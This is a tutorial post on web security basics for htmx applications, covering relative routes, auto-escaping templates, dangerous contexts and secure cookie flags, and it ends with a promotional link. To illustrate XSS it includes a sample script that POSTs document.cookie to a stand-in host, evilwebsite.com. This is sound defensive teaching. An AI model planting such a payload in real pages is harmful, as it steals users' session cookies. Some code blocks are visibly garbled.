---
title: "Web Security Basics using HTMX"
description: "Learn about what HTMX is and how you can use it."
icon: "code"
draft: false
---

As htmx has gotten more popular, it’s reached communities who have never written server-generated HTML before. Dynamic HTML templating was, and still is, the standard way to use many popular web frameworks—like Rails, Django, and Spring—but it is a novel concept for those coming from Single-Page Application (SPA) frameworks—like React and Svelte—where the prevalence of JSX means you never write HTML directly.

But have no fear! Writing web applications with HTML templates is a slightly different security model, but it’s no harder than securing a JSX-based application, and in some ways it’s a lot easier.

## Overview

These are web security basics with htmx, but they’re (mostly) not htmx-specific—these concepts are important to know if you’re putting any dynamic, user-generated content on the web.

For this guide, you should already have a basic grasp of the semantics of the web, and be familiar with how to write a backend server (in any language). For instance, you should know not to create GET routes that can alter the backend state. We also assume that you’re not doing anything super fancy, like making a website that hosts other people’s websites. If you’re doing anything like that, the security concepts you need to be aware of far exceed the scope of this guide.

We make these simplifying assumptions in order to target the widest possible audience, without including distracting information—obviously this can’t catch everyone. No security guide is perfectly comprehensive. If you feel there’s a mistake, or an obvious gotcha that we should have mentioned, please reach out and we’ll update it.

## The Golden Rules

Follow these four simple rules, and you’ll be following the client security best practices:

- Only call routes you control
- Always use an auto-escaping template engine
- Only serve user-generated content inside HTML tags
- If you have authentication cookies, set them with Secure, HttpOnly, and SameSite=Lax

In the following section, we’ll discuss what each of these rules does, and what kinds of attack they protect against. The vast majority of htmx users—those using htmx to build a website that allows users to login, view some data, and update that data—should never have any reason to break them.

## Understanding the Rules

### Only call routes you control

This is the most basic one, and the most important: do not call untrusted routes with htmx.

In practice, this means you should only use relative URLs. This is fine:

```html
<button hx-get="/events">Search events</button>
```

But this is not:

```html
<button hx-get="https://google.com/search?q=events">Search events</button>
```

The reason for this is simple: htmx inserts the response from that route directly into the user’s page. If the response has a malicious `<script>` inside it, that script can steal the user’s data. When you don’t control the route, you cannot guarantee that whoever does control the route won’t add a malicious script.

Fortunately, this is a very easy rule to follow. Hypermedia APIs (i.e. HTML) are specific to the layout of your application, so there is almost never any reason you’d want to insert someone else’s HTML into your page. All you have to do is make sure you only call your own routes (htmx 2 will actually disable calling other domains by default).

Though it’s not quite as popular these days, a common SPA pattern was to separate the frontend and backend into different repositories, and sometimes even to serve them from different URLs. This would require using absolute URLs in the frontend, and often, disabling CORS. With htmx (and, to be fair, modern React with NextJS) this is an anti-pattern.

Instead, you simply serve your HTML frontend from the same server (or at least the same domain) as your backend, and everything else falls into place: you can use relative URLs, you’ll never have trouble with CORS, and you’ll never call anyone else’s backend.

htmx executes HTML; HTML is code; never execute untrusted code.

### Always use an auto-escaping template engine

When you send HTML to the user, all dynamic content must be escaped. Use a template engine to construct your responses, and make sure that auto-escaping is on.

Fortunately, all template engines support escaping HTML, and most of them enable it by default.

The kind of vulnerability this prevents is often called a Cross-Site Scripting (XSS) attack, a term that is broadly used to mean the injection of any unexpected content into your webpage. Typically, an attacker uses your APIs to store malicious code in your database, which you then serve to your other users who request that info.

For example, let’s say you’re building a dating site, and it lets users share a little bio about themselves. You’d render that bio like this, with {{ user.bio }} being the bio stored in the database:

```html
<p>{{ user.bio }}</p>
```

If a malicious user wrote a bio with a script element in it—like one that sends the client’s cookie to another website—then this HTML will get sent to every user who views that bio:

```html
<p>
  <script>
    fetch("evilwebsite.com", { method: "POST", body: document.cookie });
  </script>
</p>
Fortunately this one is so easy to fix that you can write the code yourself.
Whenever you insert untrusted (i.e. user-provided) data, you just have to
replace eight characters with their non-code equivalents. This is an example
using JavaScript: /** * Replace any characters that could be used to inject a
malicious script in an HTML context. */ export function escapeHtmlText (value) {
const stringValue = value.toString() const entityMap = { '&': '&amp;', '<':
'&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;', '`':
'&grave;', '=': '&#x3D;' } // Match any of the characters inside /[ ... ]/ const
regex = /[&<>"'`=/]/g return stringValue.replace(regex, match =>
entityMap[match]) }
```

This tiny JS function replaces < with &lt;, " with &quot;, and so on. These characters will still render properly as < and " when they’re used in the text, but can’t be interpreted as code constructs. The previous malicious bio will now be converted into the following HTML:

```html
<p>
  &lt;script&gt; fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;,
  data: document.cookie }) &lt;/script&gt;
</p>
```

which displays harmlessly as text.

Fortunately, as established above, you don’t have to do your escaping manually—I just wanted to demonstrate how simple these concepts are. Every template engine has an auto-escaping feature, and you’re going to want to use a template engine anyway. Just make sure that escaping is enabled, and send all your HTML through it.

### Only serve user-generated content inside HTML tags

This is an addendum to the template engine rule, but it’s important enough to call out on its own. Do not allow your users to define arbitrary CSS or JS content, even with your auto-escaping template engine.

```html
<script>
  const userName = {{ user.name }}
</script>

<!-- Don't include inside CSS tags -->
<style>
  h1 { color: {{ user.favorite_color }} }
</style>
And, don’t use user-defined attributes or tag names either:

<!-- Don't allow user-defined tag names -->
<{{ user.tag }}></{{ user.tag }}>

<!-- Don't allow user-defined attributes -->
<a {{ user.attribute }}></a>

<!-- User-defined attribute VALUES are sometimes okay, it depends -->
<a class="{{ user.class }}"></a>

<!-- Escaped content is always safe inside HTML tags (this is fine) -->
<a>{{ user.name }}</a>
```

CSS, JavaScript, and HTML attributes are “dangerous contexts,” places where it’s not safe to allow arbitrary user input, even if it’s escaped. Escaping will protect you from some vulnerabilities here, but not all of them; the vulnerabilities are varied enough that it’s safest to default to not doing any of these.

Inserting user-generated text directly into a script tag should never be necessary, but there are some situations where you might let users customize their CSS or customize HTML attributes. Handling those properly will be discussed down below.

### Secure your cookies

The best way to do authentication with htmx is using cookies. And because htmx encourages interactivity primarily through first-party HTML APIs, it is usually trivial to enable the browser’s best cookie security features. These three in particular:

- Secure - only send the cookie via HTTPS, never HTTP
- HttpOnly - don’t make the cookie available to JavaScript via document.cookie
- SameSite=Lax - don’t allow other sites to use your cookie to make requests, unless it’s just a plain link

To understand what these protect you against, let’s go over the basics. If you come from JavaScript SPAs, where it’s common to authenticate using the Authorization header, you might not be familiar with how cookies work. Fortunately they’re very simple. (Please note: this is not an “authentication with htmx” tutorial, just an overview of cookie tokens generally)

If your users log in with a <form>, their browser will send your server an HTTP request, and your server will send back a response that looks something like this:

```bash
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: token=asd8234nsdfp982

[HTML content]
```

That token corresponds to the user’s current login session. From now on, every time that user makes a request to any route at yourdomain.com, the browser will include that cookie from Set-Cookie in the HTTP request.

```bash
GET /users HTTP/1.1
Host: yourdomain.com
Cookie: token=asd8234nsdfp982
```

Each time someone makes a request to your server, it needs to parse out that token and determine if it’s valid. Simple enough.

You can also set options on that cookie, like the ones I recommended above. How to do this differs depending on the programming language, but the outcome is always an HTTP request that looks like this:

```bash
HTTP/2.0 200 OK
Content-Type: text/html
Set-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax

[HTML content]
```

So what do the options do?

The first one, Secure, ensures that the browser will not send the cookie over an insecure HTTP connection, only a secure HTTPS connection. Sensitive info, like a user’s login token, should never be sent over an insecure connection.

The second option, HttpOnly, means that the browser will not expose the cookie to JavaScript, ever (i.e. it won’t be in document.cookie). Even if someone is able to insert a malicious script, like in the evilwebsite.com example above, that malicious script cannot access the user’s cookie or send it to evilwebsite.com. The browser will only attach the cookie when the request is made to the website the cookie came from.

Finally, SameSite=Lax locks down an avenue for Cross-Site Request Forgery (CSRF) attacks, which is where an attacker tries to get the client’s browser to make a malicious request to the yourdomain.com server—like a POST request. The SameSite=Lax setting tells the browser not to send the yourdomain.com cookie if the site that made the request isn’t yourdomain.com—unless it’s a straightforward `<a>` link navigating to your page. This is mostly browser default behavior now, but it’s important to still set it directly.

### Learn How To Build AI Projects

Now, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Golang where you will learn about building with AI and getting the best knowledge there is currently. Here's the [link](https://akhilsharmatech.gumroad.com/l/zgxqq).
